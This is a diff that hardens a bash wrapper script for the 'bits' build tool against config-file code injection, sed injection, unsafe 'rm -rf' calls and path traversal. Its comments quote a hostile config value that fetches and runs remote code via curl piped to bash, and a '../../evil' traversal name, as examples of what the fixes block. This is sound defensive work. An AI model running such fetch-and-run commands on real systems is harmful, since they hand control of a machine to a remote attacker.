@@ -1,8 +1,8 @@
 #!/bin/bash -e
 
-BITSDIR=`dirname $0`
+BITSDIR="$(dirname "$0")"
 
-ARGV=("$@"); ARGC=("$#")
+ARGV=("$@"); ARGC=$#   # ARGC must be a plain integer, not an array
 
 function printHelp() {
 cat >&2 <<EoF
@@ -69,11 +69,12 @@ Usage: $0 \\
         ${ET}BITS_WORK_DIR=<path_to_bits_sw_dir>${EZ}
         ${ET}eval "\`bits shell-helper\`"${EZ}
 
-    ${EM}build${EZ}  Build a package. Use ${ET}bits build --help${EZ} for details.
-    ${EM}clean${EZ}  Clean build artifacts. Use ${ET}bits clean --help${EZ} for details.
-    ${EM}deps${EZ}   Show dependency tree. Use ${ET}bits deps --help${EZ} for details.
-    ${EM}doctor${EZ} Verify build environment. Use ${ET}bits doctor --help${EZ} for details.
-    ${EM}init${EZ}   Initialise a local package. Use ${ET}bits init --help${EZ} for details.
+    ${EM}build${EZ}   Build a package. Use ${ET}bits build --help${EZ} for details.
+    ${EM}clean${EZ}   Clean build artifacts. Use ${ET}bits clean --help${EZ} for details.
+    ${EM}cleanup${EZ} Evict stale packages from a persistent workDir. Use ${ET}bits cleanup --help${EZ} for details.
+    ${EM}deps${EZ}    Show dependency tree. Use ${ET}bits deps --help${EZ} for details.
+    ${EM}doctor${EZ}  Verify build environment. Use ${ET}bits doctor --help${EZ} for details.
+    ${EM}init${EZ}    Initialise a local package. Use ${ET}bits init --help${EZ} for details.
     ${EM}version${EZ} Display bits version.
 
 EoF
@@ -112,31 +113,46 @@ function detectShell() {
 
 function collectModules() {
   if [[ -z "$NO_REFRESH" ]]; then
-    # Collect all modulefiles in one place
-    rm -rf $WORK_DIR/MODULES/$ARCHITECTURE
-    mkdir -p $WORK_DIR/MODULES/$ARCHITECTURE/BASE
-    cat > $WORK_DIR/MODULES/$ARCHITECTURE/BASE/1.0 <<EOF
+    # Collect all modulefiles in one place.
+    # Guard against empty variables before any rm -rf to prevent accidental
+    # deletion of paths like /MODULES/ if WORK_DIR or ARCHITECTURE is unset.
+    [[ -n "$WORK_DIR" && -n "$ARCHITECTURE" ]] || \
+      { printf "${ER}ERROR: WORK_DIR or ARCHITECTURE is empty; cannot refresh modules${EZ}\n" >&2; return 1; }
+    rm -rf "${WORK_DIR}/MODULES/${ARCHITECTURE}"
+    mkdir -p "${WORK_DIR}/MODULES/${ARCHITECTURE}/BASE"
+    cat > "${WORK_DIR}/MODULES/${ARCHITECTURE}/BASE/1.0" <<EOF
 #%Module1.0
-set base_path $WORK_DIR/$ARCHITECTURE
+set base_path ${WORK_DIR}/${ARCHITECTURE}
 setenv BASEDIR \$base_path
 set osname [uname sysname]
 set osarchitecture [uname machine]
 EOF
-    while read PKG; do
+    while read -r PKG; do
       PKGVER=${PKG##*/}
       PKGNAME=${PKG%/*}
       PKGNAME=${PKGNAME##*/}
       [[ ! -e "$PKG/etc/modulefiles/$PKGNAME" ]] && continue
-      mkdir -p "$WORK_DIR/MODULES/$ARCHITECTURE/$PKGNAME"
-      cp "$PKG/etc/modulefiles/$PKGNAME" "$WORK_DIR/MODULES/$ARCHITECTURE/$PKGNAME/$PKGVER"
-    done < <(find $WORK_DIR/$ARCHITECTURE -maxdepth 2 -mindepth 2 2> /dev/null)
+      mkdir -p "${WORK_DIR}/MODULES/${ARCHITECTURE}/${PKGNAME}"
+      cp "$PKG/etc/modulefiles/$PKGNAME" "${WORK_DIR}/MODULES/${ARCHITECTURE}/${PKGNAME}/${PKGVER}"
+    done < <(find "${WORK_DIR}/${ARCHITECTURE}" -maxdepth 2 -mindepth 2 2> /dev/null)
   else
     printf "${EY}WARNING: not updating modulefiles${EZ}\n" >&2
   fi
 }
 
 function normModules() {
-  echo "$@" | sed -e 's/,/ /g; s/'${BITS_PKG_PREFIX}'@//g; s!::!/!g'
+  # Avoid interpolating $BITS_PKG_PREFIX into a sed expression: if the
+  # prefix contains sed metacharacters or the delimiter it can inject
+  # arbitrary sed commands.  Use pure bash string operations instead.
+  local input="${*//,/ }"   # replace commas with spaces
+  local result=()
+  local token
+  for token in $input; do
+    token="${token#"${BITS_PKG_PREFIX}@"}"  # strip package prefix
+    token="${token//::///}"                  # :: → /
+    result+=("$token")
+  done
+  echo "${result[*]}"
 }
 
 function existModules() {
@@ -153,14 +169,51 @@ function stripDyld() {
 }
 
 function readBitsRc() {
-  cfgfile=$1
-  tmpfile=`mktemp`
-  if [ -f $cfgfile ]
-  then   
-    awk '/^\[bits]$/,/^$/ {print}' $cfgfile | sed 's/ *= */=/g' | grep  = > $tmpfile &&  . $tmpfile
-    awk "/^\[$organisation]$/,/^$/ {print}" $cfgfile | sed 's/ *= */=/g' | grep -v "^\[$organisation\]" | grep = > $tmpfile && . $tmpfile
-  fi
-  rm -rf $tmpfile
+  # SECURITY: never source the config file or its derived content directly.
+  # Sourcing key=value pairs allows arbitrary shell-code injection via crafted
+  # config values (e.g.  work_dir = $(curl evil/pwn|bash)).
+  # Instead, extract each known key individually with awk and assign it to
+  # the corresponding variable using a whitelist case statement.
+  local cfgfile="$1"
+  [[ -f "$cfgfile" ]] || return 0
+
+  # Read a single key from a given INI section.  awk stays in section mode
+  # between a [section] header and the next blank line or EOF.  Only the first
+  # occurrence of each key is returned (INI convention).
+  _rc_get() {
+    local section="$1" key="$2"
+    awk -v section="$section" -v key="$key" '
+      /^\[/ { in_section = ($0 == "[" section "]") }
+      in_section && /^[[:space:]]*[^#;]/ {
+        sub(/^[[:space:]]*/, ""); sub(/[[:space:]]*$/, "")
+        if (match($0, "^" key "[[:space:]]*=[[:space:]]*")) {
+          print substr($0, RLENGTH+1)
+          exit
+        }
+      }
+    ' "$cfgfile"
+  }
+
+  # Whitelist of recognised keys → shell variable names.
+  # Only these assignments are ever made; no arbitrary execution is possible.
+  local val
+  for mapping in \
+      "organisation:organisation" \
+      "branding:branding" \
+      "search_path:search_path" \
+      "repo_dir:repo_dir" \
+      "sw_dir:sw_dir" \
+      "pkg_prefix:pkg_prefix"
+  do
+    local key="${mapping%%:*}"
+    local var="${mapping##*:}"
+    val="$(_rc_get "bits" "$key")"
+    # Also check the organisation-specific section if organisation is known.
+    if [[ -z "$val" && -n "$organisation" ]]; then
+      val="$(_rc_get "$organisation" "$key")"
+    fi
+    [[ -n "$val" ]] && printf -v "$var" '%s' "$val"
+  done
 }
 
 function configBits() {
@@ -176,19 +229,12 @@ function configBits() {
     
   cfile=""
 
-  for cfg in  $1 bits.rc .bitsrc $HOME/.bitsrc 
+  for cfg in "$1" bits.rc .bitsrc "$HOME/.bitsrc"
   do
-    if [ "x$cfg" !=  "x" -a -f $cfg ]
-    then
-      cfile=$cfg
-      break
-    fi
+    [[ -n "$cfg" && -f "$cfg" ]] && { cfile="$cfg"; break; }
   done
-    
-  if [ "x$cfile" != "x" ] 
-  then
-    readBitsRc $cfile
-  fi
+
+  [[ -n "$cfile" ]] && readBitsRc "$cfile"
     
   export BITS_ORGANISATION=${organisation:-$BITS_ORGANISATION}
   export BITS_BRANDING=${branding:-$BITS_BRANDING}
@@ -222,8 +268,8 @@ set -- "${new_args[@]}"
 for arg in "$@"
 do
   case $arg in
-    analytics|architecture|build|clean|deps|doctor|init|version|-debug|-d)
-         mkdir -p $BITS_WORK_DIR || echo "Cannot create directory: " $BITS_WORK_DIR 
+    analytics|architecture|build|clean|cleanup|deps|doctor|init|version|-debug|-d)
+         mkdir -p "$BITS_WORK_DIR" || echo "Cannot create directory: $BITS_WORK_DIR"
         "$BITSDIR/bitsBuild" "$@"
 	    exit $?
         ;;
@@ -299,7 +345,7 @@ do
 	  i=$((i+1)); COMMAND_IN_ENV=("${ARGV[@]:${i}}");
 	  break ;;
       *)
-	  ARGS+=(${ARGV[$i]});;
+	  ARGS+=("${ARGV[$i]}");;
    esac
 done
 
@@ -353,7 +399,7 @@ fi
 WORK_DIR=$(cd "$WORK_DIR"; pwd)
 [[ -z "$ARCHITECTURE" ]] && ARCHITECTURE="$("bitsBuild" architecture 2> /dev/null || true)"
 [[ -z "$ARCHITECTURE" ]] && ARCHITECTURE="$("$BITSDIR/bitsBuild" architecture 2> /dev/null || true)"
-[[ -z "$ARCHITECTURE" || "$ARCHITECTURE" == "<unknown>" ]] && ARCHITECTURE=$(ls -1t $WORK_DIR | grep -vE '^[A-Z]+$' | head -n1)
+[[ -z "$ARCHITECTURE" || "$ARCHITECTURE" == "<unknown>" ]] && ARCHITECTURE=$(ls -1t "$WORK_DIR" 2>/dev/null | grep -vE '^[A-Z]+$' | head -n1)
 [[ -z "$ARCHITECTURE" ]] && { printHelp "Cannot autodetect architecture"; false; }
 
 # Look for modulecmd (v3) or modulecmd-compat (>= v4)
@@ -362,9 +408,9 @@ MODULECMD=$(command -v modulecmd 2> /dev/null || true)
 [[ -x "$MODULECMD" ]] || MODULECMD="$(brew --prefix modules 2> /dev/null || true)/libexec/modulecmd-compat"
 [[ -x "$MODULECMD" ]] || { installHint; false; }
 
-if [[ -d $WORK_DIR/MODULES/$ARCHITECTURE ]]; then
-  touch $WORK_DIR/MODULES/$ARCHITECTURE/.testwrite 2> /dev/null || NO_REFRESH=1
-  rm -f $WORK_DIR/MODULES/$ARCHITECTURE/.testwrite 2> /dev/null || true
+if [[ -d "${WORK_DIR}/MODULES/${ARCHITECTURE}" ]]; then
+  touch "${WORK_DIR}/MODULES/${ARCHITECTURE}/.testwrite" 2> /dev/null || NO_REFRESH=1
+  rm -f "${WORK_DIR}/MODULES/${ARCHITECTURE}/.testwrite" 2> /dev/null || true
 fi
 
 export MODULEPATH="$WORK_DIR/MODULES/$ARCHITECTURE${MODULEPATH:+":$MODULEPATH"}"
@@ -381,6 +427,12 @@ case "$ACTION" in
     if [[ $DEVOPT == 1 ]];then
       PS1DEV=" (dev)"
       for MODULE in $MODULES; do
+        # Reject module names containing path-traversal sequences to prevent
+        # escaping the software directory (e.g. "../../evil").
+        if [[ "$MODULE" == *..* ]]; then
+          printf "${ER}ERROR: invalid module name '%s' (contains '..')${EZ}\n" "$MODULE" >&2
+          exit 1
+        fi
         . "$WORK_DIR/$ARCHITECTURE/$MODULE/etc/profile.d/init.sh"
       done
     else
@@ -444,14 +496,14 @@ case "$ACTION" in
   ;;
   avail)
     collectModules
-    exec $MODULECMD bash avail
+    exec "$MODULECMD" bash avail
   ;;
   list)
-    exec $MODULECMD bash list
+    exec "$MODULECMD" bash list
   ;;
   modulecmd)
     collectModules
-    exec $MODULECMD "${ARGS[@]}"
+    exec "$MODULECMD" "${ARGS[@]}"
     ;;
   '')
     printHelp "What do you want to do?"
